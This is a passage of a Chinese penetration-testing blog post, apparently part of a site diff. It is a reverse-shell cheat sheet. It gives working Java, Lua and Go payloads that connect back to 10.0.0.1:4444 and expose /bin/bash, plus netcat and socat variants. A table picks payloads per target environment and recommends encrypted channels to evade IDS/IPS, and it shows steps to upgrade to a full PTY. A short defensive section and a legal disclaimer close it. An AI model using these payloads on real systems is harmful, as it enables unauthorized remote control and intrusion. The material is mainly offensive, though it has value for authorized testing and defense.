+<h3 id="11-1-单行版（通过-jrunscript-jshell）"><a href="#11-1-单行版（通过-jrunscript-jshell）" class="headerlink" title="11.1 单行版（通过 jrunscript &#x2F; jshell）"></a>11.1 单行版（通过 jrunscript &#x2F; jshell）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jrunscript -e <span class="string">&#x27;var p=new java.lang.ProcessBuilder(&quot;/bin/bash&quot;).redirectErrorStream(true).start(); var s=new java.net.Socket(&quot;10.0.0.1&quot;,4444); var pi=p.getInputStream(), pe=p.getOutputStream(), so=s.getOutputStream(), si=s.getInputStream(); while(!s.isClosed())&#123; while(pi.available()&gt;0) so.write(pi.read()); while(si.available()&gt;0) pe.write(si.read()); so.flush(); pe.flush(); Thread.sleep(50); &#125;; p.destroy(); s.close();&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="11-2-编译为-class-后执行"><a href="#11-2-编译为-class-后执行" class="headerlink" title="11.2 编译为 .class 后执行"></a>11.2 编译为 .class 后执行</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.net.*;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RevShell</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-i&quot;</span>&#125;);</span><br><span class="line">        <span class="type">Socket</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Socket</span>(<span class="string">&quot;10.0.0.1&quot;</span>, <span class="number">4444</span>);</span><br><span class="line">        <span class="comment">// 线程1: shell输出 -&gt; socket</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123; <span class="keyword">try</span> &#123; <span class="keyword">var</span> pi=p.getInputStream(); <span class="keyword">var</span> so=s.getOutputStream(); <span class="type">byte</span>[] b=<span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">4096</span>]; <span class="type">int</span> n; <span class="keyword">while</span>((n=pi.read(b))!=-<span class="number">1</span>) so.write(b,<span class="number">0</span>,n); &#125; <span class="keyword">catch</span>(Exception e)&#123;&#125; &#125;).start();</span><br><span class="line">        <span class="comment">// 线程2: socket输入 -&gt; shell</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123; <span class="keyword">try</span> &#123; <span class="keyword">var</span> si=s.getInputStream(); <span class="keyword">var</span> pe=p.getOutputStream(); <span class="type">byte</span>[] b=<span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">4096</span>]; <span class="type">int</span> n; <span class="keyword">while</span>((n=si.read(b))!=-<span class="number">1</span>) pe.write(b,<span class="number">0</span>,n); &#125; <span class="keyword">catch</span>(Exception e)&#123;&#125; &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>适用场景</strong>：目标运行 JVM，且 <code>jrunscript</code>（JDK 自带）可用。</p>
+</blockquote>
+<hr>
+<h2 id="十二、Lua-反弹-Shell"><a href="#十二、Lua-反弹-Shell" class="headerlink" title="十二、Lua 反弹 Shell"></a>十二、Lua 反弹 Shell</h2><p>Lua 常用于 Nginx（OpenResty）、Redis、游戏服务端等场景。</p>
+<h3 id="12-1-使用-LuaSocket-库"><a href="#12-1-使用-LuaSocket-库" class="headerlink" title="12.1 使用 LuaSocket 库"></a>12.1 使用 LuaSocket 库</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lua -e <span class="string">&#x27;local s=require(&quot;socket&quot;); local t=s.tcp(); t:connect(&quot;10.0.0.1&quot;,4444); local p=io.popen(&quot;/bin/bash -i&quot;,&quot;w&quot;); while true do local cmd=t:receive(); p:write(cmd..&quot;\n&quot;); p:flush(); local out=p:read(&quot;*a&quot;); t:send(out); end&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="12-2-无需-LuaSocket（通过-os-execute-逐条执行）"><a href="#12-2-无需-LuaSocket（通过-os-execute-逐条执行）" class="headerlink" title="12.2 无需 LuaSocket（通过 os.execute 逐条执行）"></a>12.2 无需 LuaSocket（通过 os.execute 逐条执行）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lua -e <span class="string">&#x27;local s=io.popen(&quot;nc 10.0.0.1 4444 -e /bin/bash&quot;,&quot;r&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>后者依赖系统已有 netcat，但 Lua 复杂度最低。</p>
+<blockquote>
+<p><strong>适用场景</strong>：目标为 Redis 服务器（利用 <code>eval</code> 命令）、OpenResty&#x2F;Nginx+Lua 环境，或游戏服务器。</p>
+</blockquote>
+<hr>
+<h2 id="十三、Golang-反弹-Shell"><a href="#十三、Golang-反弹-Shell" class="headerlink" title="十三、Golang 反弹 Shell"></a>十三、Golang 反弹 Shell</h2><p>Go 编译为独立二进制文件，不依赖运行时，适合无法上传多文件时的场景。</p>
+<h3 id="13-1-源码一行式（通过-go-run）"><a href="#13-1-源码一行式（通过-go-run）" class="headerlink" title="13.1 源码一行式（通过 go run）"></a>13.1 源码一行式（通过 go run）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;package main; import(&quot;net&quot;;&quot;os/exec&quot;;&quot;os&quot;); func main()&#123; c,_:=net.Dial(&quot;tcp&quot;,&quot;10.0.0.1:4444&quot;); cmd:=exec.Command(&quot;/bin/bash&quot;); cmd.Stdin=c; cmd.Stdout=c; cmd.Stderr=c; cmd.Run() &#125;&#x27;</span> &gt; /tmp/rev.go &amp;&amp; go run /tmp/rev.go</span><br></pre></td></tr></table></figure>
+
+<h3 id="13-2-预编译后上传"><a href="#13-2-预编译后上传" class="headerlink" title="13.2 预编译后上传"></a>13.2 预编译后上传</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;net&quot;</span></span><br><span class="line">    <span class="string">&quot;os/exec&quot;</span></span><br><span class="line">    <span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    conn, _ := net.Dial(<span class="string">&quot;tcp&quot;</span>, <span class="string">&quot;10.0.0.1:4444&quot;</span>)</span><br><span class="line">    cmd := exec.Command(<span class="string">&quot;/bin/bash&quot;</span>)</span><br><span class="line">    cmd.Stdin = conn</span><br><span class="line">    cmd.Stdout = conn</span><br><span class="line">    cmd.Stderr = conn</span><br><span class="line">    cmd.Run()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>交叉编译命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GOOS=linux GOARCH=amd64 go build -o rev rev.go</span><br><span class="line">GOOS=windows GOARCH=amd64 go build -o rev.exe rev.go</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>适用场景</strong>：开发环境中已有 Go 工具链；或渗透测试人员预编译好静态二进制，上传到目标后运行。优势是二进制体积小、无依赖。</p>
+</blockquote>
+<hr>
+<h2 id="十四、快速决策：选择哪个？"><a href="#十四、快速决策：选择哪个？" class="headerlink" title="十四、快速决策：选择哪个？"></a>十四、快速决策：选择哪个？</h2><table>
+<thead>
+<tr>
+<th>目标环境特征</th>
+<th>推荐方案</th>
+<th>原因</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Linux，bash 完整</td>
+<td><strong>Bash &#x2F;dev&#x2F;tcp</strong></td>
+<td>最简，无需额外依赖</td>
+</tr>
+<tr>
+<td>Linux，python 已安装</td>
+<td><strong>Python pty.spawn</strong></td>
+<td>可获得伪终端，兼容性好</td>
+</tr>
+<tr>
+<td>Linux，无 python 无 nc</td>
+<td><strong>Perl 或 Awk</strong></td>
+<td>老旧系统通常有它们</td>
+</tr>
+<tr>
+<td>Web 服务器 (Apache&#x2F;Nginx)</td>
+<td><strong>PHP</strong></td>
+<td>几乎必装</td>
+</tr>
+<tr>
+<td>Windows</td>
+<td><strong>PowerShell</strong></td>
+<td>默认安装，功能强大</td>
+</tr>
+<tr>
+<td>需要加密传输</td>
+<td><strong>Socat SSL</strong> 或 <strong>OpenSSL</strong></td>
+<td>绕过 IDS&#x2F;IPS 检测</td>
+</tr>
+<tr>
+<td>极简环境（BusyBox）</td>
+<td><strong>Netcat + mkfifo</strong></td>
+<td>管道方案万能</td>
+</tr>
+<tr>
+<td>需要伪终端 (PTY)</td>
+<td><strong>Python pty.spawn</strong> 或 <strong>Socat</strong></td>
+<td>Tab 补全、Ctrl+C 等</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="十五、升级到完整-PTY（交互式终端）"><a href="#十五、升级到完整-PTY（交互式终端）" class="headerlink" title="十五、升级到完整 PTY（交互式终端）"></a>十五、升级到完整 PTY（交互式终端）</h2><p>反弹得到的 Shell 往往是”哑终端”，不支持 Tab 补全、<code>Ctrl+C</code> 中断、方向键等。可以通过以下步骤升级：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Step 1: 在反弹 Shell 中</span></span><br><span class="line">python3 -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line"><span class="comment"># 或使用 script 命令</span></span><br><span class="line">script -qc /bin/bash /dev/null</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 2: 按 Ctrl+Z 将 nc 放入后台</span></span><br><span class="line"><span class="comment"># 在攻击端本地执行：</span></span><br><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span>; <span class="built_in">fg</span></span><br><span class="line"><span class="comment"># 然后按 Enter 两次</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 3: 在反弹 Shell 中</span></span><br><span class="line"><span class="built_in">export</span> TERM=xterm-256color</span><br><span class="line"><span class="built_in">export</span> SHELL=/bin/bash</span><br><span class="line"><span class="built_in">stty</span> rows 50 columns 200  <span class="comment"># 根据实际终端尺寸调整</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="使用-Socat-直接获得-PTY"><a href="#使用-Socat-直接获得-PTY" class="headerlink" title="使用 Socat 直接获得 PTY"></a>使用 Socat 直接获得 PTY</h3><p>攻击端：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat file:`<span class="built_in">tty</span>`,raw,<span class="built_in">echo</span>=0 tcp-listen:4444</span><br></pre></td></tr></table></figure>
+
+<p>目标端：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat <span class="built_in">exec</span>:<span class="string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4444</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="十六、防御建议（蓝队视角）"><a href="#十六、防御建议（蓝队视角）" class="headerlink" title="十六、防御建议（蓝队视角）"></a>十六、防御建议（蓝队视角）</h2><ol>
+<li><strong>输入验证与参数化</strong>：对所有用户输入进行严格白名单校验，禁止直接拼接系统命令。</li>
+<li><strong>最小权限原则</strong>：Web 应用以低权限用户运行，限制 <code>/bin/bash</code>、<code>nc</code> 等命令的执行。</li>
+<li><strong>出站防火墙规则</strong>：限制服务器主动外连的端口与协议，默认拒绝所有出站连接。</li>
+<li><strong>禁用危险函数</strong>：在 <code>php.ini</code> 中配置 <code>disable_functions = exec,passthru,shell_exec,system,proc_open,popen</code>。</li>
+<li><strong>EDR&#x2F;HIDS 检测</strong>：部署主机入侵检测系统，监控异常进程创建（如 <code>bash -i</code> 配合网络连接）。</li>
+<li><strong>WAF 规则</strong>：对常见反弹 Shell 关键词（<code>/dev/tcp</code>、<code>fsockopen</code>、<code>TCPSocket</code>、<code>pty.spawn</code>）进行拦截。</li>
+</ol>
+<hr>
+<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>反弹 Shell 是渗透测试中的核心技能。熟练掌握多技术栈的变体，可以在受限环境中灵活选择最优方案。但请再次牢记：<strong>未经授权的渗透测试属于违法行为</strong>，本文所有技巧仅用于合法授权的安全测试与学习研究。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+              <a href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag"># Web安全</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/Framework-Tomcat-exploitation/" rel="prev" title="Tomcat漏洞利用">
+                  <i class="fa fa-angle-left"></i> Tomcat漏洞利用
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/Code-audit-Java/" rel="next" title="代码审计：Java审计入门">
+                  代码审计：Java审计入门 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">YunShang</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
